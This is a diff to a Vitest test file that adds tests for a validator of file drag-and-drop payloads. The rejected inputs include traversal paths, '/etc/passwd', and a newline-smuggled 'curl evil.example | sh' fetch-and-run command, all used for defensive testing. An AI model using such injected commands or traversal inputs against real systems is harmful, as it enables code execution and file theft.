@@ -3,7 +3,7 @@
  * rule (separator spacing around the caret, empty path, out-of-range caret).
  */
 import { describe, expect, it } from 'vitest'
-import { FILE_DRAG_MIME, hasFileDrag, insertPathIntoDraft } from '../src/client/drag/file-drag.ts'
+import { FILE_DRAG_MIME, hasFileDrag, insertPathIntoDraft, isValidFileDragPayload } from '../src/client/drag/file-drag.ts'
 
 describe('hasFileDrag', () => {
   it('detects the custom file MIME among drag types', () => {
@@ -13,6 +13,24 @@ describe('hasFileDrag', () => {
     expect(hasFileDrag(['text/plain'])).toBe(false)
     expect(hasFileDrag(undefined)).toBe(false)
     expect(hasFileDrag([])).toBe(false)
+  })
+})
+
+describe('isValidFileDragPayload', () => {
+  it('accepts ordinary workspace-relative paths', () => {
+    expect(isValidFileDragPayload('src/index.ts')).toBe(true)
+    expect(isValidFileDragPayload('a b/c.ts')).toBe(true)
+    expect(isValidFileDragPayload('deep/nested/dir/file.md')).toBe(true)
+  })
+
+  it('rejects forged or dangerous payloads', () => {
+    expect(isValidFileDragPayload('')).toBe(false)
+    expect(isValidFileDragPayload('/etc/passwd')).toBe(false)
+    expect(isValidFileDragPayload('../secret')).toBe(false)
+    expect(isValidFileDragPayload('a/../../secret')).toBe(false)
+    expect(isValidFileDragPayload('win\\path')).toBe(false)
+    expect(isValidFileDragPayload('line1\ncurl evil.example | sh')).toBe(false)
+    expect(isValidFileDragPayload('x'.repeat(513))).toBe(false)
   })
 })
 
